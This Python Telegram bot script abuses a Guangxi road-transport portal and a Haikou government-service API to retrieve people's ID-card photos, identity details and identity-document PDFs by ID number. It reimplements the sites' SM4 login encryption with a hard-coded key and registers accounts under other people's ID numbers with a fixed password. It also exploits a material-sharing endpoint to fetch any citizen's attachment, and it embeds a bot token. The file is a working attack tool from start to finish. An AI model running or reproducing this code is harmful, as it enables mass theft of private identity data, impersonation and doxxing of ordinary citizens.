#!/usr/bin/env python3
import sys
print("===== Bot starting (双功能版 - 基于您提供的完整脚本) =====")

import asyncio
import io
import re
import time
import json
import urllib.parse
import base64
import os
import requests
import urllib3
from typing import Optional
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
#  第一部分：通用配置（只需填 Bot Token）
# ============================================================================
BOT_TOKEN = "5849383582:AAHIfKvl2O3buRgiIq4rwtC4b95KsP3BfS4"  # 您的 Bot Token

# -------------------- 广西配置（直接使用您提供的脚本中的值，不修改）--------------------
# 以下所有配置均来自您最后发来的 manual 脚本，原封不动
BASE_URL = "http://www.gxdlys.com"
PASSWORD = "268428."   # 与您的脚本一致

# -------------------- 海南配置（与之前一致，如未填写则保持占位符）--------------------
HAINAN_COOKIES = {
    "cna": "REPLACE_CNA_HERE",          # 如果您之前填过，这里就是真实值；否则就是占位符
    "JSESSIONID": "REPLACE_JSESSIONID_HERE",
    "SESSION": "REPLACE_SESSION_HERE",
    "SERVERID": "REPLACE_SERVERID_HERE",
}
HAINAN_TOKEN = "REPLACE_ZWFW_TOKEN_HERE"

# ============================================================================
#  第二部分：SM4 加密（与您的脚本完全一致，不做任何修改）
# ============================================================================
SM4_KEY = "CatsPK0WWWRRhjkw"
SboxTable = [
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
]
FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
CK = [
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
]

def rotl(x, n):
    left = (x << n) & 0xffffffff
    signed_x = x - 0x100000000 if (x & 0x80000000) else x
    right = (signed_x >> (32 - n)) & 0xffffffff
    return left | right

def sm4_sbox(a):
    return (SboxTable[(a >> 24) & 0xFF] << 24) | \
           (SboxTable[(a >> 16) & 0xFF] << 16) | \
           (SboxTable[(a >> 8) & 0xFF] << 8) | \
           SboxTable[a & 0xFF]

def sm4_lt(ka):
    bb = sm4_sbox(ka)
    return bb ^ rotl(bb, 2) ^ rotl(bb, 10) ^ rotl(bb, 18) ^ rotl(bb, 24)

def sm4_calci_rk(ka):
    bb = sm4_sbox(ka)
    return bb ^ rotl(bb, 13) ^ rotl(bb, 23)

def sm4_f(x0, x1, x2, x3, rk):
    return x0 ^ sm4_lt(x1 ^ x2 ^ x3 ^ rk)

def pkcs7_pad(data: bytes, block_size=16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len]) * pad_len

def sm4_encrypt_ecb(plain_text: str) -> str:
    data = plain_text.encode('utf-8')
    padded = pkcs7_pad(data, 16)
    key_bytes = SM4_KEY.encode('utf-8')
    mk = [0] * 4
    for i in range(4):
        mk[i] = (key_bytes[i*4] << 24) | (key_bytes[i*4+1] << 16) | (key_bytes[i*4+2] << 8) | key_bytes[i*4+3]
    k = [0] * 36
    for i in range(4):
        k[i] = mk[i] ^ FK[i]
    sk = [0] * 32
    for i in range(32):
        k[i+4] = k[i] ^ sm4_calci_rk(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i])
        sk[i] = k[i+4]
    result = bytearray()
    for offset in range(0, len(padded), 16):
        block = padded[offset:offset+16]
        x = [0] * 36
        for i in range(4):
            x[i] = (block[i*4] << 24) | (block[i*4+1] << 16) | (block[i*4+2] << 8) | block[i*4+3]
        for i in range(32):
            x[i+4] = sm4_f(x[i], x[i+1], x[i+2], x[i+3], sk[i])
        out = bytearray(16)
        for i in range(4):
            val = x[35-i]
            out[i*4] = (val >> 24) & 0xFF
            out[i*4+1] = (val >> 16) & 0xFF
            out[i*4+2] = (val >> 8) & 0xFF
            out[i*4+3] = val & 0xFF
        result.extend(out)
    return base64.b64encode(result).decode('utf-8')

# ============================================================================
#  第三部分：广西手动脚本的全部函数（原样复制，不修改任何配置）
# ============================================================================
session_gx = requests.Session()
HEADERS_GX = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
    "Referer": "http://www.gxdlys.com/Wechat/User/Regist",
}

def gx_login_auto(id_card):
    """自动登录（用于已注册用户）"""
    if not id_card: return False, "身份证为空"
    try:
        enc_login = urllib.parse.quote(sm4_encrypt_ecb(id_card))
        enc_pwd = urllib.parse.quote(sm4_encrypt_ecb(PASSWORD))
        data = f"loginName={enc_login}&password={enc_pwd}&wechatUid="
        headers = HEADERS_GX.copy()
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["Referer"] = "http://www.gxdlys.com/Wechat/Home/Login"
        headers["Host"] = "www.gxdlys.com"
        r = session_gx.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=headers, data=data, timeout=60)
        if r.status_code == 200:
            res = r.json()
            if res.get("statusCode") == 200:
                return True, None
            else:
                return False, res.get("info", "未知错误")
    except Exception as e:
        return False, f"异常: {e}"
    return False, "登录失败"

def gx_query_photo(name, id_card):
    try:
        encoded_name = urllib.parse.quote(name)
        url = f"{BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
        headers = HEADERS_GX.copy()
        headers["Referer"] = "http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1"
        headers["Host"] = "www.gxdlys.com"
        r = session_gx.get(url, headers=headers, timeout=60)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        print(f"查询异常: {e}")
    return None

def gx_download_photo(file_id):
    if not file_id:
        return None
    try:
        url = f"{BASE_URL}/System/FileService/ShowFile?fileId={file_id}"
        r = session_gx.get(url, timeout=60)
        if r.status_code == 200 and 'image' in r.headers.get('Content-Type', ''):
            return r.content
    except Exception as e:
        print(f"下载异常: {e}")
    return None

def gx_login_manual(id_card, password):
    """手动登录（用于注册后登录）"""
    try:
        enc_login = urllib.parse.quote(sm4_encrypt_ecb(id_card))
        enc_pwd = urllib.parse.quote(sm4_encrypt_ecb(password))
        data = f"loginName={enc_login}&password={enc_pwd}&wechatUid="
        headers = HEADERS_GX.copy()
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["Referer"] = "http://www.gxdlys.com/Wechat/Home/Login"
        headers["Host"] = "www.gxdlys.com"
        r = session_gx.post("http://www.gxdlys.com/Wechat/Home/PostLogin", headers=headers, data=data, timeout=60)
        if r.status_code == 200:
            res = r.json()
            if res.get("statusCode") == 200:
                return True, None
            else:
                return False, res.get("info", "未知错误")
    except Exception as e:
        return False, f"异常: {e}"
    return False, "登录失败"

def gx_send_sms(phone, captcha_code, uuid):
    try:
        data = {
            "phoneId": phone,
            "type": "10001",
            "IsEncryptPhoneId": "false",
            "verifyCode": captcha_code,
            "uuid": uuid
        }
        r = session_gx.post(
            f"{BASE_URL}/System/SmsService/PostVerifyCode",
            data=data,
            headers={
                **HEADERS_GX,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
            },
            timeout=60
        )
        if r.status_code == 200:
            res = r.json()
            if res.get("statusCode") == 200:
                return True, None
            else:
                return False, res.get('info', '发送失败')
        else:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"异常: {e}"

def gx_register(phone, sms_code, captcha_code, real_name, id_card):
    try:
        data = {
            "zipArea": "",
            "userType": "-1",
            "wechatUid": "",
            "realName": real_name,
            "iDCard": id_card,
            "loginName": id_card,
            "password": PASSWORD,
            "idcardImg1Url": "218,8a785f252c8518",
            "idcardImg2Url": "216,8a7860c46589f3",
            "idcardImg3Url": "214,8a78664776227f",
            "idcardImg4Url": "",
            "ownerId": "",
            "tel": phone,
            "isTelEncrypted": "false",
            "validCode": sms_code,
            "verifyCode": captcha_code
        }
        r = session_gx.post(
            f"{BASE_URL}/Wechat/User/RegistAdd",
            data=data,
            headers={
                **HEADERS_GX,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer": "http://www.gxdlys.com/Wechat/User/Regist"
            },
            timeout=60
        )
        if r.status_code == 200:
            res = r.json()
            if res.get("statusCode") == 200:
                return True, None
            else:
                return False, res.get("info", "注册失败")
        else:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"异常: {e}"

def gx_get_captcha():
    try:
        r = session_gx.get(f"{BASE_URL}/Wechat/FaceDetect/GetVerifyCode", headers=HEADERS_GX, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("statusCode") == 200:
                img_b64 = data["data"]["img"]
                uuid = data["data"]["uuid"]
                img_bytes = base64.b64decode(img_b64)
                return True, img_bytes, uuid
            else:
                return False, data.get("info", "获取失败"), None
        else:
            return False, f"HTTP {r.status_code}", None
    except Exception as e:
        return False, f"异常: {e}", None

# ============================================================================
#  第四部分：海南查询功能（与之前一致，保留原有配置）
# ============================================================================
def hainan_query(id_card):
    id_card = id_card.strip().upper()
    if len(id_card) != 18:
        return False, "身份证号必须为18位"
    if not id_card[:17].isdigit():
        return False, "前17位必须为数字"
    if id_card[17] not in '0123456789X':
        return False, "最后一位必须是数字或X"

    session = requests.Session()
    session.cookies.update(HAINAN_COOKIES)
    session.verify = False

    HEADERS_HN = {
        "Host": "zwfw.dn.haikou.gov.cn",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "zwfw-token": HAINAN_TOKEN,
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; MEIZU 21 Build/UKQ1.230917.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/141.0.7390.97 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Accept": "*/*",
        "Origin": "https://zwfw.dn.haikou.gov.cn",
        "X-Requested-With": "com.hanweb.hnzwfw.android.activity",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    url1 = "https://zwfw.dn.haikou.gov.cn/rest/materialshare/canShareMaterial"
    data = {
        "itemMaterialId": "1498591712970792960",
        "materialCode": "1173207393439670272",
        "materialName": "委托书原件及委托代理人的身份证明",
        "interfaceParam": "ztmc,zzbh,dzzz_name,cardid,dzzz_type",
        "interfaceParamName": "身份证",
        "canShare": False,
        "isSignature": "N",
        "appInterfaceId": "136",
        "param": {
            "ztmc": "刘德华",
            "zzbh": "",
            "dzzz_name": "随便起个名",
            "cardid": id_card,
            "dzzz_type": "1"
        },
        "itemId": "1047370300041120912",
        "userId": "1547878749006024704"
    }

    for attempt in range(5):
        try:
            res1 = session.post(url1, headers=HEADERS_HN, json=data, timeout=30)
            result1 = res1.json()
        except Exception as e:
            print(f"海南请求异常: {e}")
            time.sleep(2)
            continue

        if result1.get("code") == "1":
            try:
                attachment_id = result1["resultDatas"]["result"]["resultDatas"]["attachmentList"][0]["id"]
                url2 = f"https://zwfw.dn.haikou.gov.cn/rest/attachment/{attachment_id}"
                res2 = session.get(url2, timeout=30)
                if res2.status_code == 200:
                    return True, res2.content
                else:
                    return False, f"下载附件失败，HTTP {res2.status_code}"
            except (KeyError, IndexError, AttributeError) as e:
                return False, f"解析失败: {e}"
        else:
            msg = result1.get('message', '未知错误')
            print(f"海南查询失败: {msg}")
            time.sleep(2)
    return False, "连续失败，请检查 Cookie/Token"

async def hainansf(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("❌ 格式错误\n正确格式：/hainansf <身份证号>")
        return
    id_card = args[0].strip()
    if len(id_card) != 18:
        await update.message.reply_text("❌ 身份证号必须为18位")
        return
    await update.message.reply_text("⏳ 正在查询海南系统...")
    loop = asyncio.get_event_loop()
    success, result = await loop.run_in_executor(None, hainan_query, id_card)
    if success:
        await context.bot.send_document(chat_id=update.effective_chat.id, document=io.BytesIO(result), filename=f"{id_card}.pdf", caption="✅ 海南查询成功")
    else:
        await update.message.reply_text(f"❌ {result}")

# ============================================================================
#  第五部分：Telegram 对话处理器（广西手动流程）
# ============================================================================
WAIT_GX_MANUAL_NAME, WAIT_GX_MANUAL_IDCARD, WAIT_GX_MANUAL_PHONE, WAIT_GX_MANUAL_CAPTCHA, WAIT_GX_MANUAL_SMS = range(10, 15)

async def guangxi_manual_start(update, context):
    await update.message.reply_text(
        "📝 广西手动注册查询流程\n"
        "此流程将尝试直接登录，若未注册则进行注册（需要手机号、图形验证码、短信验证码）\n\n"
        "请输入姓名："
    )
    return WAIT_GX_MANUAL_NAME

async def guangxi_manual_name(update, context):
    context.user_data['gx_name'] = update.message.text.strip()
    await update.message.reply_text("请输入身份证号码：")
    return WAIT_GX_MANUAL_IDCARD

async def guangxi_manual_idcard(update, context):
    id_card = update.message.text.strip()
    if len(id_card) != 18 or not id_card[:17].isdigit():
        await update.message.reply_text("❌ 身份证号必须为18位数字（最后一位可为X），请重新输入：")
        return WAIT_GX_MANUAL_IDCARD
    context.user_data['gx_idcard'] = id_card
    await update.message.reply_text("请输入手机号码：")
    return WAIT_GX_MANUAL_PHONE

async def guangxi_manual_phone(update, context):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 11:
        await update.message.reply_text("❌ 手机号必须为11位数字，请重新输入：")
        return WAIT_GX_MANUAL_PHONE
    context.user_data['gx_phone'] = phone

    # 尝试直接登录
    await update.message.reply_text("⏳ 尝试登录...")
    id_card = context.user_data['gx_idcard']
    ok, msg = gx_login_auto(id_card)
    if ok:
        # 登录成功，直接查询
        await update.message.reply_text("✅ 登录成功！正在查询照片...")
        name = context.user_data['gx_name']
        result = gx_query_photo(name, id_card)
        if result and result.get("statusCode") == 200:
            data = result.get("data", {})
            item2 = data.get("item2", {})
            info = f"姓名：{item2.get('xm', '')}\n身份证：{item2.get('gmsfhm', '')}\n民族：{item2.get('mz', '')}\n有效期：{item2.get('uL_FROM_DATE', '')} 至 {item2.get('uL_END_DATE', '')}"
            photo_bytes = gx_download_photo(data.get("item1"))
            await update.message.reply_text(f"✅ 查询成功！\n{info}")
            if photo_bytes:
                await context.bot.send_photo(chat_id=update.effective_chat.id, photo=io.BytesIO(photo_bytes))
        else:
            await update.message.reply_text("❌ 查询失败，请检查信息")
        context.user_data.clear()
        return ConversationHandler.END
    else:
        if "未注册" in msg or "不存在" in msg:
            await update.message.reply_text(f"ℹ️ 账号未注册，将进入注册流程。\n正在获取图形验证码...")
            ok, img_bytes, uuid = gx_get_captcha()
            if ok:
                context.user_data['gx_uuid'] = uuid
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=io.BytesIO(img_bytes),
                    caption="请输入图形验证码（不区分大小写）："
                )
                return WAIT_GX_MANUAL_CAPTCHA
            else:
                await update.message.reply_text(f"❌ 获取图形验证码失败：{img_bytes}")
                context.user_data.clear()
                return ConversationHandler.END
        else:
            await update.message.reply_text(f"❌ 登录失败：{msg}，请检查信息或稍后再试")
            context.user_data.clear()
            return ConversationHandler.END

async def guangxi_manual_captcha(update, context):
    captcha = update.message.text.strip().upper()
    if not captcha:
        await update.message.reply_text("❌ 请输入验证码：")
        return WAIT_GX_MANUAL_CAPTCHA
    context.user_data['gx_captcha'] = captcha

    # 发送短信验证码
    phone = context.user_data['gx_phone']
    uuid = context.user_data['gx_uuid']
    await update.message.reply_text("⏳ 正在发送短信验证码...")
    ok, msg = gx_send_sms(phone, captcha, uuid)
    if ok:
        await update.message.reply_text("✅ 短信验证码已发送，请查看手机短信，输入验证码：")
        return WAIT_GX_MANUAL_SMS
    else:
        await update.message.reply_text(f"❌ 发送短信失败：{msg}")
        context.user_data.clear()
        return ConversationHandler.END

async def guangxi_manual_sms(update, context):
    sms_code = update.message.text.strip()
    if not sms_code:
        await update.message.reply_text("❌ 请输入短信验证码：")
        return WAIT_GX_MANUAL_SMS

    # 执行注册
    phone = context.user_data['gx_phone']
    name = context.user_data['gx_name']
    id_card = context.user_data['gx_idcard']
    captcha = context.user_data['gx_captcha']
    await update.message.reply_text("⏳ 正在注册账号...")

    ok, msg = gx_register(phone, sms_code, captcha, name, id_card)
    if ok:
        await update.message.reply_text("✅ 注册成功！正在登录查询...")
        # 登录
        ok2, msg2 = gx_login_manual(id_card, PASSWORD)
        if ok2:
            result = gx_query_photo(name, id_card)
            if result and result.get("statusCode") == 200:
                data = result.get("data", {})
                item2 = data.get("item2", {})
                info = f"姓名：{item2.get('xm', '')}\n身份证：{item2.get('gmsfhm', '')}\n民族：{item2.get('mz', '')}\n有效期：{item2.get('uL_FROM_DATE', '')} 至 {item2.get('uL_END_DATE', '')}"
                photo_bytes = gx_download_photo(data.get("item1"))
                await update.message.reply_text(f"✅ 查询成功！\n{info}")
                if photo_bytes:
                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=io.BytesIO(photo_bytes))
            else:
                await update.message.reply_text("❌ 查询失败，请稍后重试")
        else:
            await update.message.reply_text(f"❌ 登录失败：{msg2}")
    else:
        await update.message.reply_text(f"❌ 注册失败：{msg}")
    context.user_data.clear()
    return ConversationHandler.END

# ============================================================================
#  第六部分：启动命令
# ============================================================================
async def start(update, context):
    await update.message.reply_text(
        "👋 可用命令：\n"
        "/guangxi_manual → 广西手动注册查询（支持未注册时自动注册，需手机验证）\n"
        "/hainansf <身份证号> → 海南身份证附件查询（PDF）\n"
        "\n示例：\n"
        "/hainansf 460101199001011234"
    )

# ============================================================================
#  主程序
# ============================================================================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('hainansf', hainansf))

    # 广西手动注册查询对话
    conv_manual = ConversationHandler(
        entry_points=[CommandHandler('guangxi_manual', guangxi_manual_start)],
        states={
            WAIT_GX_MANUAL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, guangxi_manual_name)],
            WAIT_GX_MANUAL_IDCARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, guangxi_manual_idcard)],
            WAIT_GX_MANUAL_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, guangxi_manual_phone)],
            WAIT_GX_MANUAL_CAPTCHA: [MessageHandler(filters.TEXT & ~filters.COMMAND, guangxi_manual_captcha)],
            WAIT_GX_MANUAL_SMS: [MessageHandler(filters.TEXT & ~filters.COMMAND, guangxi_manual_sms)],
        },
        fallbacks=[CommandHandler('start', start)]
    )
    app.add_handler(conv_manual)

    print("===== Bot is ready (基于您提供的完整脚本) =====")
    app.run_polling()

if __name__ == '__main__':
    main()
